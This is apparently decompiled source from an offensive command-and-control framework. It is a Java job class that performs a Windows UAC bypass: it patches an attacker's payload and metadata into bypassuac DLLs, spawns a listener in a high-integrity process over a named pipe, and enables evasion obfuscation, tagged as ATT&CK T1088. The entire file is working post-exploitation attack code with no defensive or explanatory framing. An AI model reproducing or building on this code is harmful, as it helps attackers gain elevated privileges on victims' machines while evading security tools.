package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;
import pe.PostExObfuscator;

public class BypassUACJob extends Job {
    protected String name;

    protected String listener;

    protected String artifact;

    public BypassUACJob(TaskBeacon taskBeacon, String string1, String string2, byte[] arrby) {
        super(taskBeacon);
        this.name = string1;
        this.listener = string2;
        this.artifact = CommonUtils.bString(arrby);
    }

    public String getDescription() {
        return "Tasked beacon to spawn " + this.listener + " in a high integrity process";
    }

    public String getShortDescription() {
        return "bypassuac";
    }

    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/bypassuac.x64.dll";
        }
        return "resources/bypassuac.dll";
    }

    public String getPipeName() {
        return "bypassuac";
    }

    public String getTactic() {
        return "T1088";
    }

    public int getCallbackType() {
        return 0;
    }

    public int getWaitTime() {
        return 30000;
    }

    public byte[] fix(byte[] arrby) {
        String str1 = CommonUtils.pad(this.artifact, Character.MIN_VALUE, 24576);
        arrby = CommonUtils.patch(arrby, "ARTIFACT ABCDEFGHIJKLMNOPQRSTUVWXYZ", str1);
        Packer packer = new Packer();
        packer.little();
        packer.addInt(this.artifact.length());
        packer.addString(this.name, 28);
        // todo '\u0000' is Character.MIN_VALUE
        String str2 = CommonUtils.pad(CommonUtils.bString(packer.getBytes()), Character.MIN_VALUE, 64);
        return CommonUtils.patch(arrby, "META ABCDEFGHIJKLMNOPQRSTUVWXYZ", str2);
    }

    public void obfuscate(PostExObfuscator postExObfuscator, byte[] arrby) {
        postExObfuscator.enableEvasions();
    }
}
